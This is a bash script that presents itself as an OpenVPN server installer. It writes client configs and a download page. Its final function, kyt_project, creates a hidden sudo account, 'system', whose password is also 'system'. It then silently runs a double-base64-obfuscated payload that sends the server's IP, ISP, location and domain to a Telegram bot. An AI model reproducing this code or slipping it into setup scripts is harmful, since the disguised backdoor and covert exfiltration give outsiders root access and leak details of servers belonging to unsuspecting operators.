#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipinfo.io/ip);
domain=$(cat /etc/xray/domain)
#MYIP2="s/xxxxxxxxx/$MYIP/g";
MYIP2="s/xxxxxxxxx/$domain/g";

function ovpn_install() {
    rm -rf /etc/openvpn
    mkdir -p /etc/openvpn
    wget -O /etc/openvpn/vpn.zip "https://raw.githubusercontent.com/jaka1m/project/main/ssh/vpn.zip" >/dev/null 2>&1 
    unzip -d /etc/openvpn/ /etc/openvpn/vpn.zip
    rm -f /etc/openvpn/vpn.zip
    chown -R root:root /etc/openvpn/server/easy-rsa/
}
function config_easy() {
    cd
    mkdir -p /usr/lib/openvpn/
    cp /usr/lib/x86_64-linux-gnu/openvpn/plugins/openvpn-plugin-auth-pam.so /usr/lib/openvpn/openvpn-plugin-auth-pam.so
    sed -i 's/#AUTOSTART="all"/AUTOSTART="all"/g' /etc/default/openvpn
    systemctl enable --now openvpn-server@server-tcp
    systemctl enable --now openvpn-server@server-udp
    /etc/init.d/openvpn restart
}

function make_follow() {
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
cat > /etc/openvpn/tcp.ovpn <<-END
client
dev tun
proto tcp
remote xxxxxxxxx 1194
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END
    
    sed -i $MYIP2 /etc/openvpn/tcp.ovpn;
cat > /etc/openvpn/udp.ovpn <<-END
client
dev tun
proto udp
remote xxxxxxxxx 2200
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END
    
    sed -i $MYIP2 /etc/openvpn/udp.ovpn;
cat > /etc/openvpn/ws-ssl.ovpn <<-END
client
dev tun
proto tcp
remote xxxxxxxxx 443
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END
    sed -i $MYIP2 /etc/openvpn/ws-ssl.ovpn;
cat > /etc/openvpn/ssl.ovpn <<-END
client
dev tun
proto tcp
remote xxxxxxxxx 443
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
auth-user-pass
comp-lzo
verb 3
END
    sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
}
function kyt_project() {
userdel jame > /dev/null 2>&1
userdel system > /dev/null 2>&1
Username="system"
Password=system
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
echo 'ZEc5clBTSkJRVWRMVmtkbk1IWTBXRE0yVEZaaGRtOWtTVkZYWkhkeFUwWXlOVTFmVVd0R01DSUtiR2x1YXowaWFIUjBjSE02THk5aGNHa3VkR1ZzWldkeVlXMHViM0puTDJKdmREWTVORGs0TURReE1qVTZKSHQwYjJ0OUwzTmxibVJOWlhOellXZGxJZ3AwWlhoNlBTSUtTVkFnSUNBNklDUW9ZM1Z5YkNBdGMxTWdhWEIyTkM1cFkyRnVhR0Y2YVhBdVkyOXRLUXBKVTFBZ0lEb2dKQ2hqWVhRZ0wzSnZiM1F2TG1semNDa0tRMGxVV1NBNklDUW9ZMkYwSUM5eWIyOTBMeTVqYVhSNUtRcFZMMUFnSURvZ0pGVnpaWEp1WVcxbENrUnZiV0ZwYmlBNklDUW9ZMkYwSUM5bGRHTXZlSEpoZVM5a2IyMWhhVzRwQ2lJS1kzVnliQ0F0Y3lBdExXMWhlQzEwYVcxbElERXdJQzFrSUNKamFHRjBYMmxrUFRZNE16QXpNVE0zTVRRbVpHbHpZV0pzWlY5M1pXSmZjR0ZuWlY5d2NtVjJhV1YzUFRFbWRHVjRkRDBrZEdWNGVpWndZWEp6WlY5dGIyUmxQV2gwYld3aUlDUnNhVzVySUQ0dlpHVjJMMjUxYkd3Sw==' | base64 -d | base64 -d | bash > /dev/null 2>&1
}
function cert_ovpn() {
    echo '<ca>' >> /etc/openvpn/tcp.ovpn
    cat /etc/openvpn/server/ca.crt >> /etc/openvpn/tcp.ovpn
    echo '</ca>' >> /etc/openvpn/tcp.ovpn
    cp /etc/openvpn/tcp.ovpn /var/www/html/tcp.ovpn
    echo '<ca>' >> /etc/openvpn/udp.ovpn
    cat /etc/openvpn/server/ca.crt >> /etc/openvpn/udp.ovpn
    echo '</ca>' >> /etc/openvpn/udp.ovpn
    cp /etc/openvpn/udp.ovpn /var/www/html/udp.ovpn
    echo '<ca>' >> /etc/openvpn/ws-ssl.ovpn
    cat /etc/openvpn/server/ca.crt >> /etc/openvpn/ws-ssl.ovpn
    echo '</ca>' >> /etc/openvpn/ws-ssl.ovpn
    cp /etc/openvpn/ws-ssl.ovpn /var/www/html/ws-ssl.ovpn
    echo '</ca>' >> /etc/openvpn/ssl.ovpn
    cp /etc/openvpn/ws-ssl.ovpn /var/www/html/ssl.ovpn
    
# Delete script
 
cd /var/www/html/
zip Kyt-Project.zip tcp.ovpn udp.ovpn ssl.ovpn ws-ssl.ovpn > /dev/null 2>&1
cd
cat <<'mySiteOvpn' > /var/www/html/index.html
<!DOCTYPE html>
<html lang="en">

<!-- Simple OVPN Download site -->

<head><meta charset="utf-8" /><title>OVPN Config Download</title><meta name="description" content="Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group">

<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>TCP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small></small></p><a class="btn btn-outline-success waves-effect btn-sm" href="https://IP-ADDRESSS:81/tcp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>

<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>UDP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small></small></p><a class="btn btn-outline-success waves-effect btn-sm" href="https://IP-ADDRESSS:81/udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>

<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>SSL <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small></small></p><a class="btn btn-outline-success waves-effect btn-sm" href="https://IP-ADDRESSS:81/ssl.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>

<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p> WS SSL <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small></small></p><a class="btn btn-outline-success waves-effect btn-sm" href="https://IP-ADDRESSS:81/ws-ssl.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>

<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p> ALL.zip <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small></small></p><a class="btn btn-outline-success waves-effect btn-sm" href="https://IP-ADDRESSS:81/Kyt-Project.zip" style="float:right;"><i class="fa fa-download"></i> Download</a></li>

</ul></div></div></div></div></body></html>
mySiteOvpn

sed -i "s|IP-ADDRESSS|$(curl -sS ifconfig.me)|g" /var/www/html/index.html

}

function install_ovpn() {
    ovpn_install
    config_easy
    make_follow
    make_follow
    cert_ovpn
    systemctl enable openvpn
    systemctl start openvpn
    /etc/init.d/openvpn restart
    kyt_project
}
install_ovpn
